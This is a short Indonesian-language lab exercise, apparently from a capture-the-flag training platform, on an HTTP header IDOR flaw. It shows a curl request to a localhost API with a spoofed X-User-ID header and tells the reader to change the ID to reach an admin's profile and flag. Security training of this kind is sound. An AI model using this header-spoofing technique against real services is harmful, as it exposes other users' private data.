[S-10] HTTP Header IDOR

Tujuan: Dapatkan data profil milik admin_zero (user ID 3) via API.

Area Lab

Kirim request ke /api/v3/my-data dengan header HTTP kustom X-User-ID.

Contoh Request (cURL):

curl -H "X-User-ID: 1" http://127.0.0.1:5000/api/v3/my-data

Ubah nilai header menjadi 3 untuk mendapatkan flag.
